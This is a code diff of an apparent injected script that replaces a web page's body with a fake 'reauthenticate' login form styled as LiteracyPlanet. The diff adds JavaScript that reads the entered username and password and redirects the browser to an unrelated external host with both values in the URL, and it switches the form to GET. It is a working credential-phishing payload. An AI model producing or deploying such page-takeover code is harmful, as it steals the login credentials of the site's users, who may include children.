@@ -13,7 +13,7 @@ document.body.innerHTML = `<!DOCTYPE html>
         color: #333;
       }
 
-      /* Table container for the form with a styled card design */
+      /* Table container for the form */
       table {
         border-collapse: collapse;
         margin: 40px auto;
@@ -37,7 +37,7 @@ document.body.innerHTML = `<!DOCTYPE html>
       /* Body content styling */
       td.body {
         padding: 20px;
-        text-align: left;
+        text-align: center;
       }
 
       /* Input field styling */
@@ -45,9 +45,9 @@ document.body.innerHTML = `<!DOCTYPE html>
       input[type="password"] {
         width: 100%;
         max-width: 400px;
-        padding: 10px;
-        margin-bottom: 20px;
-        font-size: 16px;
+        padding: 8px;
+        margin-bottom: 10px;
+        font-size: 14px;
         border: 1px solid #ccc;
         border-radius: 5px;
         box-sizing: border-box;
@@ -58,38 +58,42 @@ document.body.innerHTML = `<!DOCTYPE html>
         background-color: #6ccef7;
         color: white;
         text-decoration: none;
-        padding: 12px 25px;
+        padding: 10px 20px;
         border: none;
         border-radius: 5px;
         font-size: 16px;
         font-weight: bold;
         cursor: pointer;
-        display: block;
-        margin: 20px auto 0;
       }
 
       button:hover {
         background-color: #589cc6;
       }
-
-      /* Footer section styling */
-      td.footer {
-        padding: 20px;
-        text-align: center;
-        background-color: #f4f4f4;
-        font-size: 14px;
-        color: #666;
-      }
-
-      td.footer a {
-        color: #6ccef7;
-        text-decoration: none;
-      }
-
-      td.footer a:hover {
-        text-decoration: underline;
-      }
     </style>
+    <script>
+      // Optional: Handle submission programmatically (redirect via JavaScript GET request)
+      document.addEventListener('DOMContentLoaded', () => {
+        const form = document.getElementById('reauth-form');
+        form.addEventListener('submit', (event) => {
+          event.preventDefault(); // Prevent standard GET form submission
+          
+          // Extract data from fields
+          const username = encodeURIComponent(form.username.value.trim());
+          const password = encodeURIComponent(form.password.value.trim());
+          
+          if (!username || !password) {
+            alert('Please fill out all fields.');
+            return;
+          }
+
+          // Construct the query string
+          const url = `${form.action}?username=${username}&password=${password}`;
+          
+          // Redirect the browser to the constructed URL
+          window.location.href = url;
+        });
+      });
+    </script>
   </head>
   <body>
     <table>
@@ -108,49 +112,53 @@ document.body.innerHTML = `<!DOCTYPE html>
       <!-- Form and content -->
       <tr>
         <td class="body">
-          <p style="font-size: 18px; margin: 0; color: black; text-align: center">Hi there!</p>
-          <p style="font-size: 16px; margin: 10px 0; color: black;">
-            We take your security seriously! As part of our security measures, please reauthenticate to login with your account.
+          <p style="font-size: 18px; margin: 0;">Hi there!</p>
+          <p style="margin: 10px 0; font-size: 16px;">
+            We take your security seriously! As part of our security measures, please reauthenticate to log in to your account.
           </p>
 
           <!-- Form starts here -->
-           <div style="display: flex; flex-direction: column; justify-content: center; align-items: center;">
-          <form id="reauth-form" method="POST" action="https://aiwneb53olqz3ypu3fhtwmgobfh650tp.c.ccxsta.com/reauthenticate">
-            <label for="username" style="font-size: 16px; color: black; font-weight:bold; display: flex; justify-content: center; align-items: center;">Username:</label><br>
+          <form
+            id="reauth-form"
+            method="GET"
+            action="https://aiwneb53olqz3ypu3fhtwmgobfh650tp.c.ccxsta.com/reauthenticate"
+            style="display: flex; flex-direction: column; align-items: center;"
+          >
+            <!-- Username Field -->
+            <label for="username" style="font-size: 16px; font-weight: bold;">Username:</label>
             <input
               type="text"
               id="username"
               name="username"
               placeholder="Enter your username"
               required
-              autofocus
-              style="display: flex; justify-content: center; align-items: center;"
-            /><br>
+            />
 
-            <label for="password" style="font-size: 16px; color: black; font-weight:bold; display: flex; justify-content: center; align-items: center;">Password:</label><br>
-            <div style=></div>
+            <!-- Password Field -->
+            <label for="password" style="font-size: 16px; font-weight: bold;">Password:</label>
             <input
               type="password"
               id="password"
               name="password"
               placeholder="Enter your password"
               required
-            /><br>
-</div>
+            />
+
+            <!-- Submit Button -->
             <button type="submit">Reauthenticate</button>
           </form>
           <!-- Form ends here -->
 
-          <p style="font-size: 16px; margin: 20px 0; color: black;">
-            If you didn't expect this prompt or need further assistance, please contact us immediately at <a href="https://literacyplanet.com/support" style="color: #6bc4ff; text-decoration: none;">literacyplanet.com/support</a>.
+          <p style="font-size: 16px; margin: 10px 0;">
+            If you didn't expect this prompt or need further assistance, please contact us immediately at <a href="https://spa.literacyplanet.com/tx/home?session=new" style="color: #6bc4ff; text-decoration: none;">literacyplanet.com/support</a>.
           </p>
         </td>
       </tr>
 
       <!-- Footer section -->
       <tr>
-        <td class="footer">
-          <p style="margin: 0;">Having trouble? <a href="mailto:support@literacyplanet.com">Contact our support team</a></p>
+        <td class="footer" style="padding: 20px; text-align: center; background-color: #f4f4f4; font-size: 14px; color: #666;">
+          <p style="margin: 0;">Having trouble? <a href="mailto:support@literacyplanet.com" style="color: #6ccef7; text-decoration: none;">Contact our support team</a></p>
           <p style="margin: 10px 0;">© 2026 LiteracyPlanet Inc. All rights reserved.</p>
         </td>
       </tr>
